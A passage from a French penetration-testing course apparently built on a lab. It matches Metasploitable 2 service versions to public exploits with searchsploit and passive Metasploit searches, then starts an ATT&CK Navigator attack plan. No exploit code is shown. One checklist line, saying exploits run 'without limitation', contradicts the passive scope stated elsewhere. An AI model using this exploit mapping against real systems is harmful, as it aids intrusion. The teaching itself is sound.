ProFTPd 1.3.2 rc3 < 1.3.3b (Linux) - Telnet IAC Buffer Overflow   | linux/remote/16851.rb
```

La cible expose ProFTPD `1.3.1`. La plage du titre commence à `1.3.2 rc3`. `1.3.1` est **antérieur** à `1.3.2 rc3` : le candidat est **rejeté** pour cette version.

**Preuve** — `preuves/ch1-lab2/searchsploit-cve-2010-4221.txt`.

#### Étape 7 — Croiser automatiquement un XML Nmap avec la base

**But** — générer automatiquement une requête par produit détecté par Nmap et repérer les faux positifs produits par ce mode.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — XML du Lab-01 : `preuves/ch1-lab1/nmap-versions.xml`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab2/searchsploit-nmap.txt \
  searchsploit --disable-colour --nmap preuves/ch1-lab1/nmap-versions.xml
```

**Explication de la commande**

- `prouve preuves/ch1-lab2/searchsploit-nmap.txt` : enregistre la sortie complète dans une preuve.
- `searchsploit` : interroge la base locale.
- `--disable-colour` : sortie sans séquences ANSI.
- `--nmap preuves/ch1-lab1/nmap-versions.xml` : lit le XML Nmap et transforme chaque produit et version en requête `searchsploit -t`.
- `Skipping term: ftp` : exemple de terme trop général ignoré par le mode XML.
- Piège courant : considérer le mode XML comme une validation ; il ne compare pas les plages de versions et produit des faux positifs.

**Résultat attendu**

SearchSploit lit le XML, ignore les termes trop généraux (`ftp`), puis affiche des blocs `searchsploit -t ...` avec les résultats. Exemple réel :

```text
[i] SearchSploit's XML mode (without verbose enabled). To enable: searchsploit -v --xml...
[i] Reading: 'preuves/ch1-lab1/nmap-versions.xml'
[-] Skipping term: ftp (Term is too general...)
[i] /usr/bin/searchsploit -t --disable-colour vsftpd
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
```

Le mode XML est un **point de départ** : il ne vérifie pas les plages de versions. Chaque candidat doit être validé manuellement.

**Preuve** — `preuves/ch1-lab2/searchsploit-nmap.txt`.

#### Étape 8 — Recherche Metasploit passive

**But** — retrouver les modules Metasploit correspondant à vsftpd sans charger ni exécuter un module.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — `msfconsole` installé ; base Metasploit initialisée.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab2/msf-search-vsftpd.txt bash -c "timeout 90 msfconsole -q -x 'search vsftpd; exit'"
```

**Explication de la commande**

- `prouve ... msf-search-vsftpd.txt` : enregistre la sortie et le code retour.
- `bash -c "..."` : exécute la chaîne dans un shell enfant, nécessaire pour `timeout` et les quotes internes.
- `timeout 90` : borne l'exécution à 90 secondes.
- `msfconsole -q` : démarre Metasploit en mode silencieux, sans bannière.
- `-x 'search vsftpd; exit'` : exécute la recherche puis quitte immédiatement.
- `search vsftpd` : commande passive qui liste les modules ; elle ne charge pas le module.
- Piège courant : enchaîner avec `use`, `set`, `exploit` ou `run` ; ces commandes sont réservées au Lab-07. Le module `auxiliary/dos` est un déni de service et reste hors périmètre.

**Résultat attendu**

```text
Matching Modules
================
0  auxiliary/dos/ftp/vsftpd_232          2011-02-03  normal     Yes  VSFTPD 2.3.2 and Earlier STAT Denial of Service
1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  Yes  VSFTPD 2.3.4 Backdoor Command Execution
```

La commande `search` ne charge pas le module. Dans **ce lab**, elle ne doit jamais être suivie de `use`, `set`, `exploit` ou `run` : l'exploitation est traitée séparément dans Lab-07. Le module `auxiliary/dos` est une attaque par déni de service : il reste hors périmètre.

**Preuve** — `preuves/ch1-lab2/msf-search-vsftpd.txt`.

#### Étape 9 — Corriger un exemple d'EDB-ID

**But** — vérifier un identifiant d'exploit cité en exemple et le remplacer par l'identifiant correct du noyau Linux.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — base Exploit-DB locale ; version du noyau de Metasploitable 2 lue au Lab-04.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab2/searchsploit-exemple-50910.txt searchsploit --disable-colour -p 50910
prouve preuves/ch1-lab2/searchsploit-p-5092.txt searchsploit --disable-colour -p 5092
```

**Explication de la commande**

- `prouve ... searchsploit-exemple-50910.txt` : enregistre la vérification de l'identifiant cité en exemple.
- `prouve ... searchsploit-p-5092.txt` : enregistre la vérification de l'identifiant corrigé.
- `searchsploit` : interroge la base locale.
- `--disable-colour` : sortie sans séquences ANSI.
- `-p 50910` : affiche les métadonnées de l'exploit `50910`.
- `-p 5092` : affiche les métadonnées de l'exploit `5092`.
- Piège courant : confondre un identifiant de CMS avec un exploit de noyau ; lisez le titre et les codes CVE.

**Résultat attendu**

```text
50910 : e107 CMS v3.2.1 - Multiple Vulnerabilities
5092  : Linux Kernel 2.6.17 < 2.6.24.1 - 'vmsplice' Local Privilege Escalation (2)
        Codes: CVE-2008-0600, CVE-2008-0010, CVE-2008-0009
        Verified: True
```

L'exemple `50910` est un CMS, pas un noyau Linux. L'EDB-ID correct pour l'exemple noyau est `5092`. La version de Metasploitable 2 lue au Lab-04 (`2.6.24-16-server`) est dans la plage du titre, mais l'exploitabilité réelle n'est pas testée dans ce chapitre.

**Preuve** — `preuves/ch1-lab2/searchsploit-exemple-50910.txt` et `preuves/ch1-lab2/searchsploit-p-5092.txt`.

#### Étape 10 — Vérifier la base pour le noyau de Kali

**But** — comparer le résultat de la base locale sur un noyau récent et sur le noyau de Metasploitable 2, et interpréter correctement `No Results`.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — version du noyau Kali et version `2.6.24` de la cible connues.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab2/searchsploit-kernel-kali.txt searchsploit --disable-colour linux kernel 7.1.5+kali-amd64
prouve preuves/ch1-lab2/searchsploit-kernel-2624.txt searchsploit --disable-colour linux kernel 2.6.24
```

**Explication de la commande**

- `prouve ... searchsploit-kernel-kali.txt` : enregistre la recherche sur le noyau de Kali.
- `prouve ... searchsploit-kernel-2624.txt` : enregistre la recherche sur le noyau `2.6.24`.
- `searchsploit` : interroge la base locale.
- `--disable-colour` : sortie sans séquences ANSI.
- `linux kernel 7.1.5+kali-amd64` : version récente du noyau Kali.
- `linux kernel 2.6.24` : version présente dans la plage de plusieurs exploits locaux.
- Piège courant : lire `No Results` comme « aucune vulnérabilité » ; la base locale est datée et n'est pas exhaustive.

**Résultat attendu**

```text
# noyau Kali 7.1.5
Exploits: No Results
Shellcodes: No Results

# noyau 2.6.24
Linux Kernel 2.6.17 < 2.6.24.1 - 'vmsplice' Local Privilege Escalation (2) | linux/local/5092.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' ...                                 | linux/local/40616.c
```

`No Results` pour Kali ne signifie pas « Kali invulnérable ». La base Exploit-DB est datée et ne couvre pas toutes les versions récentes. La conclusion correcte est « aucun résultat local pour cette version », pas « aucune vulnérabilité ».

**Preuve** — `preuves/ch1-lab2/searchsploit-kernel-kali.txt` et `preuves/ch1-lab2/searchsploit-kernel-2624.txt`.

#### Étape 11 — Compléter l'empreinte web, sans exécution

**But** — qualifier trois CVE web supplémentaires sans lancer d'exploit : une attaque de disponibilité, un candidat conditionnel et une validation de version.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — empreinte web du Lab-01 ; base locale disponible.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

Si vous disposez de plus de temps, complétez l'empreinte web sans exécuter d'exploit :

```bash
prouve preuves/ch1-lab2/searchsploit-cve-2011-3192.txt searchsploit --disable-colour --cve 2011-3192
prouve preuves/ch1-lab2/searchsploit-cve-2012-1823.txt searchsploit --disable-colour --cve 2012-1823
prouve preuves/ch1-lab2/searchsploit-cve-2008-0166.txt searchsploit --disable-colour --cve 2008-0166
```

**Explication de la commande**

- `prouve ... searchsploit-cve-2011-3192.txt` : enregistre la recherche de la CVE Apache.
- `prouve ... searchsploit-cve-2012-1823.txt` : enregistre la recherche de la CVE PHP CGI.
- `prouve ... searchsploit-cve-2008-0166.txt` : enregistre la recherche de la CVE OpenSSL.
- `searchsploit` : interroge la base locale.
- `--disable-colour` : sortie sans séquences ANSI.
- `--cve` : recherche le code CVE dans les métadonnées.
- Piège courant : exécuter l'exploit DoS ou considérer la CVE PHP CGI comme validée alors que `/cgi-bin/` renvoie `403`.

**Résultat attendu**

- `CVE-2011-3192` : résultats `Apache - Denial of Service` (`18221.c`, `17696.pl`). Attaque de disponibilité, **non exécutée**.
- `CVE-2012-1823` : résultats `Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution`. Condition : CGI activé. La cible a `php5-cgi` mais `/cgi-bin/` renvoie `403` dans notre test. Candidat **conditionnel**, non validé.
- `CVE-2008-0166` : résultats `OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG`. La cible a `openssl 0.9.8g-4ubuntu3`, dans la plage. Candidat **validé pour la version**, sans exécution.

**Preuve** — `preuves/ch1-lab2/searchsploit-cve-2011-3192.txt`, `searchsploit-cve-2012-1823.txt` et `searchsploit-cve-2008-0166.txt`.

#### Étape 12 — Consigner la matrice et les preuves

**But** — vérifier que chaque preuve contient un code retour et produire une empreinte d'intégrité de l'ensemble.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — preuves des étapes 1 à 11 présentes dans `preuves/ch1-lab2/`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
grep -H '^# rc=' preuves/ch1-lab2/*.txt
sha256sum preuves/ch1-lab2/*.txt preuves/ch1-lab2/*.xml > preuves/ch1-lab2/SHA256SUMS
```

**Explication de la commande**

- `grep -H '^# rc=' preuves/ch1-lab2/*.txt` : affiche le nom de chaque fichier et sa ligne de code retour.
- `-H` : force l'affichage du nom du fichier, même avec un seul fichier.
- `'^# rc='` : motif ancré en début de ligne, qui évite de confondre avec une sortie d'outil.
- `preuves/ch1-lab2/*.txt` : ensemble des preuves texte du lab.
- `sha256sum ... > preuves/ch1-lab2/SHA256SUMS` : calcule les empreintes et les écrit dans un fichier.
- `*` : glob des fichiers `.txt` et `.xml` ; le fichier `SHA256SUMS` n'existe pas encore au moment du calcul et ne s'inclut donc pas.
- Piège courant : relancer `sha256sum` après avoir créé `SHA256SUMS` en incluant `SHA256SUMS` lui-même ; le fichier de sommes ne doit pas s'inclure.

**Résultat attendu**

Un code retour par fichier et une empreinte SHA-256 par preuve.

**Preuve** — `preuves/ch1-lab2/SHA256SUMS`.

### En conclusion

Vous avez une méthode reproductible : empreinte, recherche locale, candidat, validation de version, statut. Le Lab-03 organise ces résultats dans le plan d'attaque maître et la couche Navigator.

```mermaid
flowchart LR
    A["Version observée<br/>(Nmap -sV)"] --> B["Recherche locale<br/>searchsploit"]
    B --> C["Candidat<br/>EDB-ID + CVE"]
    C --> D{"Version dans<br/>la plage du titre ?"}
    D -->|oui| E["Validé<br/>pour la version"]
    D -->|non| F["Rejeté"]
    D -->|"version floue"| G["Conditionnel<br/>ou non vérifiable"]
    E --> H["Matrice de risques<br/>(Lab-06)"]
    F --> H
    G --> H

    classDef src fill:#e3f2fd,stroke:#1565c0,color:#000
    classDef proc fill:#fff3e0,stroke:#ef6c00,color:#000
    classDef ok fill:#e8f5e9,stroke:#2e7d32,color:#000
    classDef ko fill:#ffebee,stroke:#c62828,color:#000
    class A,B,C src
    class D proc
    class E ok
    class F ko
    class G,H proc
```

**Fig 7.1** — Chaîne de validation d'un candidat CVE hors ligne. La décision centrale est la comparaison entre la version observée et la plage de versions du titre de l'exploit.

**Tableau de validation attendu**

| Service | Version observée | CVE candidate | Exploit local | Validation | Motif |
|---|---|---|---|---|---|
| vsftpd | 2.3.4 | CVE-2011-2523 | 49757, 17491 | validé | version exacte dans le titre |
| Samba | 3.0.20-Debian | CVE-2007-2447 | 16320 | validé | `3.0.20 < 3.0.25rc3` |
| UnrealIRCd | 3.2.8.1 | CVE-2010-2075 | 16922, 13853 | validé | version exacte dans le titre |
| distccd | v1 | CVE-2004-2687 | 9915 | validé | service et version correspondent |
| ProFTPD | 1.3.1 | CVE-2010-4221 | 16851, 16878 | rejeté | plage `1.3.2 rc3 < 1.3.3b` |
| BIND | 9.4.2 | (6122) | 6122 | rejeté | titre `9.4.1 < 9.4.2` exclut 9.4.2 |
| Samba | 3.0.20-Debian | (7701) | 7701 | rejeté | titre `Samba < 3.0.20` exclut 3.0.20 |
| Apache | 2.2.8 | CVE-2011-3192 | 18221, 17696 | documenté | DoS, hors périmètre d'exécution |
| PHP | 5.2.4 | CVE-2012-1823 | 29290, 29316 | conditionnel | CGI activé requis, `/cgi-bin/` 403 |
| OpenSSL | 0.9.8g-4ubuntu3 | CVE-2008-0166 | 5622, 5632 | validé (version) | plage `< 0.9.8g-9` |
| Noyau Linux | 2.6.24-16-server | CVE-2008-0600/0010/0009 | 5092 | candidat | plage `2.6.17 < 2.6.24.1` |
| Noyau Kali | 7.1.5+kali-amd64 | — | — | non vérifiable | aucun résultat local |

**Critères de réussite**

- [ ] `searchsploit -h` est exécuté et son `rc=2` est expliqué.
- [ ] Les quatre CVE de référence sont recherchées avec `--cve`.
- [ ] Les métadonnées de `16320`, `16922`, `17491` et `9915` sont enregistrées.
- [ ] ProFTPD `1.3.1` est explicitement rejeté pour CVE-2010-4221.
- [ ] BIND `9.4.2` est explicitement rejeté pour l'exploit `9.4.1 < 9.4.2`.
- [ ] Le XML Nmap est croisé avec `--nmap` et les limites sont notées.
- [ ] `msfconsole` est utilisé uniquement avec `search`.
- [ ] L'EDB-ID `50910` est corrigé en `5092`.
- [ ] La matrice de validation contient au moins 10 lignes.
- [ ] La recherche reste passive ; tous les exploits sont exécutés dans le lab sans limitation (Lab-07).

Le Lab-03 reprend ce tableau pour construire le plan d'attaque maître, le journal d'exécution et la couche Navigator.

## Lab-03 — Plan d'attaque maître et couche Navigator

### Énoncé / Contexte

Le plan d'attaque maître est le document qui **autorise et encadre** les labs. Il ne déclenche aucune attaque. Il relie chaque technique ATT&CK à un lab, une cible, une preuve, une détection, une mitigation et un rollback. La couche Navigator est la représentation visuelle de ce plan.

**Place dans la chaîne** — après la recherche de vulnérabilités (Lab-02), avant la baseline et la première phase d'exécution (Lab-04).

**Objectifs pédagogiques** — à la fin de ce lab, vous devez être capable de :

- produire un inventaire CSV d'au moins 40 techniques, sans doublon ;
- conserver les identifiants legacy et expliquer la règle de fusion ;
- générer une couche Navigator JSON valide et l'emporter dans l'outil ;
- remplir un plan maître, un PV de gel, un journal d'exécution et une fiche dry-run ;
- vérifier l'ensemble avec un script de contrôle qui retourne `PASS`.

**Plan MITRE ATT&CK**

| Élément | Valeur |
|---|---|
| Tactique | Resource Development (TA0042) |
| Techniques | T1588 Obtain Capabilities ; T1588.006 Vulnerabilities ; T1119 Automated Collection |
| Source de données | Fichiers du plan, CSV, JSON, journal |
| Contrôle défensif | Revue de plan, séparation des rôles, gel de version |
| Détection | Modification du plan après gel, écart entre plan et journal |

**Prérequis et fichiers fournis**

- `chapitre-01.md` (ce document) pour extraire les tableaux de techniques.
- Python 3.8 ou supérieur.
- Les fichiers du livrable :
  - `modeles/plan-attaque-maitre.md` ;
  - `modeles/PV-gel-plan-v1.0.md` ;
  - `modeles/journal-execution.csv` ;
  - `modeles/fiche-dry-run.md` ;
  - `modeles/inventaire-techniques.csv` (exemple généré) ;
  - `modeles/navigator-chapitres-1-5.json` (exemple généré) ;
  - `scripts/genere-inventaire.py` ;
  - `scripts/genere-navigator.py` ;
  - `scripts/verifie-lab3.sh`.
- Répertoire de travail : `preuves/ch1-lab3/`.

> **Autoportance** — si les fichiers `modeles/` et `scripts/` ne sont pas présents, les blocs autoportants de ce lab (séquencement de référence, modèle de ligne d'inventaire et couche Navigator minimale) donnent le contenu nécessaire pour reconstruire l'inventaire, la couche Navigator et le plan. Le contrôle final reste identique.

**Séquencement de référence des 24 labs**

| # | Lab | Techniques principales |
|---|---|---|
| 1 | Ch1 Lab1 | T1016, T1046 |
| 2 | Ch1 Lab2 | T1588.006 |
| 3 | Ch1 Lab3 | T1588, T1119 |
| 4 | Ch1 Lab4 | T1016, T1046, T1588.006, T1119 |
| 5 | Ch1 Lab5 | T1046 |
| 6 | Ch1 Lab6 | T1588.006 |
| 7 | Ch2 Lab1 | T1498, T1499 |
| 8 | Ch2 Lab2 | T1190, T1203, T1068 |
| 9 | Ch2 Lab3 | T1003, T1550.002, T1110, T1087.002, T1018, T1021.002, T1482, T1558.003, T1558.004 |
| 10 | Ch3 msfvenom | T1587, T1587.001, T1027, T1204.002 |
| 11 | Ch3 Lab1 | T1119, T1083, T1059.004 |
| 12 | Ch3 Lab2 | T1040, T1071, T1571 |
| 13 | Ch3 Lab3 | T1041, T1053.003, T1071.001 |
| 14 | Ch4 Lab1 | T1119, T1083, T1059.004 |
| 15 | Ch4 Lab2 | T1040, T1071, T1571 |
| 16 | Ch4 Lab3 | T1041, T1071.001, T1053.003 |
| 17 | Ch4 Lab4 | T1046 |
| 18 | Ch5 Lab1 | T1087, T1069, T1110 |
| 19 | Ch5 Lab2 | T1021, T1078 |
| 20 | Ch5 Lab3 | T1110, T1110.001 |
| 21 | Ch5 Lab4 | T1046, T1562.004 |
| 22 | Ch5 Lab5 | T1190, T1203, T1210, T1068 |
| 23 | Ch5 Lab6 | Planification défensive |
| 24 | Ch5 Lab7 | Validation |

> **Extension Lab-07/08** — le séquencement de référence reste celui des **24 entrées** du plan maître v1.0. Les labs d'exploitation ajoutés dans cette version sont documentés comme **avenant A.7** : ils ne renumérotent pas le plan, ne suppriment aucune entrée et ne modifient pas rétroactivement les statuts des chapitres 2 à 5. La checklist de remise vérifie les deux périmètres : 24 entrées de référence + avenant A.7.

**Modèle de ligne d'inventaire**

```csv
id,technique,tactique,tactic_slug,chapitre_lab,statut,chapitre_reference,statut_par_chapitre,couleur,remplace_par
T1046,Network Service Discovery,Discovery,discovery,Ch1 Lab1; Ch1 Lab4; Ch1 Lab5; Ch4 Lab4; Ch5 Lab4,Couvert,Ch5 Lab4,Ch1:Couvert; Ch5:Couvert,#ffe0b2,
```

La règle de fusion est celle du modèle : une ligne par `id`, l'historique dans `statut_par_chapitre`, le statut de référence dans `statut`.

**Couche Navigator minimale**

Si `scripts/genere-navigator.py` est absent, ce bloc produit une couche importable :

```bash
python3 - <<'PY'
import csv, json
rows = list(csv.DictReader(open("inventaire-techniques.csv", encoding="utf-8")))
tech = []
for r in rows:
    tid = r["id"].strip()
    if not (len(tid) == 5 and tid[0] == "T" and tid[1:].isdigit()):
        continue
    tech.append({"techniqueID": tid, "score": 1, "color": "#f8bbd0",
                 "comment": r.get("chapitre_lab", "")})
json.dump({"name": "Plan Chapitres 1-5", "versions": {"attack": "14",
          "navigator": "4.9.1", "layer": "4.5"},
          "domain": "enterprise-attack", "techniques": tech},
          open("navigator-chapitres-1-5.json", "w", encoding="utf-8"), indent=2)
print(len(tech), "techniques")
PY
```

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `python3` | `scripts/genere-inventaire.py`, `scripts/genere-navigator.py` | Génération CSV et couche Navigator |
| `bash` | `scripts/verifie-lab3.sh` | Contrôle automatique du plan |
| `jq` / `python3 -m json.tool` | Validation JSON | Vérification de la couche |
| `sha256sum` | `sha256sum -c SHA256SUMS` | Intégrité des livrables |
| `prouve` | `prouve preuves/ch1-lab3/... commande` | Journalisation des contrôles |

### Commande et laboratoire étape par étape

#### Étape 1 — Créer le répertoire de travail et copier les modèles

**But** — isoler les livrables du Lab-03 dans un répertoire dédié et vérifier que les modèles et les scripts sont présents avant de les exécuter.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — répertoires `modeles/` et `scripts/` fournis avec le chapitre.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
mkdir -p preuves/ch1-lab3
cp -r modeles preuves/ch1-lab3/
cp -r scripts preuves/ch1-lab3/
cd preuves/ch1-lab3
ls modeles scripts
```

**Explication de la commande**

- `mkdir -p preuves/ch1-lab3` : crée le répertoire de travail et ses parents sans erreur s'il existe déjà.
- `cp -r modeles preuves/ch1-lab3/` : copie récursivement les modèles dans le répertoire de travail.
- `cp -r scripts preuves/ch1-lab3/` : copie récursivement les scripts.
- `cd preuves/ch1-lab3` : place le shell dans le répertoire de travail pour les étapes suivantes.
- `ls modeles scripts` : vérifie la présence des fichiers copiés.
- Piège courant : copier `modeles/` sans `scripts/`, puis appeler un script absent ; le contrôle échoue dès la première ligne.

**Résultat attendu**

Les fichiers `plan-attaque-maitre.md`, `PV-gel-plan-v1.0.md`, `journal-execution.csv`, `fiche-dry-run.md` et les trois scripts sont présents.

**Preuve** — arborescence copiée dans `preuves/ch1-lab3/modeles/` et `preuves/ch1-lab3/scripts/`, contrôlée à l'étape 10 dans `preuves/ch1-lab3/verifie-lab3.txt`.

#### Étape 2 — Générer l'inventaire à partir du chapitre

**But** — produire le CSV des techniques à partir des tableaux de l'annexe A, avec expansion des sous-techniques et fusion des doublons.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — étape 1 terminée ; répertoire courant `preuves/ch1-lab3`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`

**Exemple de commande**

```bash
prouve genere-inventaire.txt \
  python3 scripts/genere-inventaire.py ../../chapitre-01.md inventaire-techniques.csv
```

**Explication de la commande**

- `prouve genere-inventaire.txt` : enregistre la sortie et le code retour du générateur.
- `python3` : exécute le script avec l'interpréteur Python 3.
- `scripts/genere-inventaire.py` : script de génération fourni avec le chapitre.
- `../../chapitre-01.md` : source des tableaux A.1 à A.5, lue depuis le répertoire de travail.
- `inventaire-techniques.csv` : fichier de sortie, en UTF-8 avec des fins de ligne `\n`.
- Le script expanse les identifiants abrégés (`.002` devient `T1499.002`), applique la règle de fusion et ajoute les six identifiants legacy `T1043`, `T1075`, `T1418`, `T1452`, `T1493` et `T119`.
- Piège courant : lancer le script depuis un autre répertoire ; le chemin `../../chapitre-01.md` ne pointe plus vers le chapitre.

**Résultat attendu**

```text
68 lignes ecrites dans inventaire-techniques.csv
```

Le script lit les tableaux A.1 à A.5 de l'annexe A, expanse les identifiants abrégés et applique la règle de fusion. La règle évite les doublons : une technique peut apparaître dans plusieurs chapitres, mais une seule ligne est produite.

**Preuve** — `preuves/ch1-lab3/genere-inventaire.txt` et `preuves/ch1-lab3/inventaire-techniques.csv`.

#### Étape 3 — Contrôler l'en-tête, les doublons et les legacy

**But** — vérifier la structure du CSV, l'absence de doublon et la présence des six identifiants legacy.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — `inventaire-techniques.csv` généré à l'étape 2.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`

**Exemple de commande**

```bash
head -1 inventaire-techniques.csv
cut -d, -f1 inventaire-techniques.csv | tail -n +2 | sort | uniq -d
grep -E '^T(1043|1075|1418|1452|1493|119),' inventaire-techniques.csv | cut -d, -f1
wc -l inventaire-techniques.csv
```

**Explication de la commande**

- `head -1 inventaire-techniques.csv` : affiche la première ligne, c'est-à-dire l'en-tête.
- `cut -d, -f1 inventaire-techniques.csv` : extrait la première colonne, l'identifiant de technique.
- `tail -n +2` : supprime l'en-tête du flux.
- `sort` : trie les identifiants pour rendre les doublons adjacents.
- `uniq -d` : n'affiche que les identifiants présents au moins deux fois ; une sortie vide signifie aucun doublon.
- `grep -E '^T(1043|1075|1418|1452|1493|119),'` : sélectionne les lignes des six legacy.
- `cut -d, -f1` : affiche uniquement leur identifiant.
- `wc -l inventaire-techniques.csv` : compte les lignes, en-tête compris.
- Piège courant : oublier `tail -n +2` et compter l'en-tête comme un doublon.

**Résultat attendu**

```text
id,technique,tactique,tactic_slug,chapitre_lab,statut,chapitre_reference,statut_par_chapitre,couleur,remplace_par
T1043
T1075
T1418
T1452
T1493
T119
69 inventaire-techniques.csv
```

`uniq -d` ne doit rien afficher. `wc -l` affiche 69 lignes : 1 en-tête + 68 techniques. Les six legacy sont conservés pour la traçabilité, mais ne sont pas des identifiants ATT&CK valides au format actuel.

**Preuve** — `preuves/ch1-lab3/inventaire-techniques.csv`, contrôlé à l'étape 10 dans `preuves/ch1-lab3/verifie-lab3.txt`.

#### Étape 4 — Générer la couche Navigator

**But** — transformer l'inventaire CSV en couche JSON importable dans MITRE ATT&CK Navigator, en excluant les identifiants qui ne respectent pas le format ATT&CK.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — `inventaire-techniques.csv` contrôlé à l'étape 3.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`

**Exemple de commande**

```bash
prouve genere-navigator.txt \
  python3 scripts/genere-navigator.py inventaire-techniques.csv navigator-chapitres-1-5.json
```

**Explication de la commande**

- `prouve genere-navigator.txt` : enregistre la sortie du générateur et son code retour.
- `python3` : exécute le script avec l'interpréteur Python 3.
- `scripts/genere-navigator.py` : générateur de couche fourni avec le chapitre.
- `inventaire-techniques.csv` : source des techniques.
- `navigator-chapitres-1-5.json` : couche JSON de sortie.
- Le script exclut les identifiants qui ne correspondent pas au motif `T` suivi de quatre chiffres ; `T119` est conservé dans le CSV pour l'historique mais exclu de la couche.
- Piège courant : forcer `T119` dans la couche et produire un JSON que Navigator refuse.

**Résultat attendu**

```text
67 techniques ecrites dans navigator-chapitres-1-5.json
Lignes CSV ignorees (ID non ATT&CK) : 1 ['T119']
```

T119 est conservé dans le CSV pour l'historique, mais exclu de la couche Navigator car son identifiant n'est pas au format `T` + quatre chiffres. C'est une décision documentée, pas un oubli.

**Preuve** — `preuves/ch1-lab3/genere-navigator.txt` et `preuves/ch1-lab3/navigator-chapitres-1-5.json`.

#### Étape 5 — Valider le JSON

**But** — vérifier que la couche est un JSON syntaxiquement valide et que son contenu structurel correspond à l'inventaire attendu.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — `navigator-chapitres-1-5.json` généré à l'étape 4.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`

**Exemple de commande**

```bash
python3 -m json.tool navigator-chapitres-1-5.json > /dev/null
echo "JSON valide : $?"
python3 - <<'PY'
import json
d = json.load(open("navigator-chapitres-1-5.json", encoding="utf-8"))
print("nom:", d["name"])
print("techniques:", len(d["techniques"]))
print("premiere:", d["techniques"][0]["techniqueID"])
PY
```

**Explication de la commande**

- `python3 -m json.tool navigator-chapitres-1-5.json > /dev/null` : analyse le JSON et envoie la sortie reformatée vers `/dev/null`.
- `> /dev/null` : supprime l'affichage du JSON reformaté ; seule l'erreur éventuelle reste visible.
- `echo "JSON valide : $?"` : affiche le code retour de `json.tool`, `0` si le fichier est valide.
- `python3 - <<'PY'` : exécute un script Python fourni sur l'entrée standard, sans créer de fichier.
- `json.load(...)` : charge la couche et échoue si le JSON est invalide.
- `d["name"]`, `len(d["techniques"])`, `d["techniques"][0]["techniqueID"]` : affichent le nom, le nombre de techniques et la première technique.
- Piège courant : conclure à la validité sur le seul code retour sans vérifier le nombre de techniques et le contenu.

**Résultat attendu**

```text
JSON valide : 0
nom: Plan Chapitres 1-5
techniques: 67
premiere: T1016
```

La couche contient `name`, `versions`, `domain` et `techniques`. La première technique est `T1016` dans l'ordre du CSV. Si le JSON est invalide, Navigator affiche une erreur d'import.

**Preuve** — `preuves/ch1-lab3/navigator-chapitres-1-5.json`, validé à l'étape 10 dans `preuves/ch1-lab3/verifie-lab3.txt`.

#### Étape 6 — Remplir le plan maître

**But** — produire le plan maître complet à partir du modèle, sans champ entre crochets, avant le gel.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — inventaire et couche Navigator générés ; modèle `modeles/plan-attaque-maitre.md` présent.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`

**Exemple de commande**

```bash
cp modeles/plan-attaque-maitre.md plan-attaque-maitre.md
```

**Explication de la commande**

- `cp` : copie le modèle vers le répertoire de travail.
- `modeles/plan-attaque-maitre.md` : modèle fourni avec le chapitre.
- `plan-attaque-maitre.md` : fichier à compléter ; il devient le livrable gelé.
- Complétez ensuite les champs entre crochets :
  - section 1 : date, auteur, validateur ;
  - section 3 : nombre de lignes, doublons, statuts ;
  - section 4 : statut des 14 tactiques ;
  - section 5 : vérifier les 24 entrées ;
  - section 7 : empreinte SHA-256 de la couche ;
  - section 8 : cases go/no-go ;
  - section 9 : signatures.
- Piège courant : laisser la date de gel, le validateur ou l'empreinte SHA-256 vides ; un plan avec des `[ ]` n'est pas gelable.

**Résultat attendu**

Plus aucun `[ ]` ni `[AAAA-MM-JJ]` dans le fichier.

**Preuve** — `preuves/ch1-lab3/plan-attaque-maitre.md`, contrôlé à l'étape 10 dans `preuves/ch1-lab3/verifie-lab3.txt`.

#### Étape 7 — Remplir le PV de gel

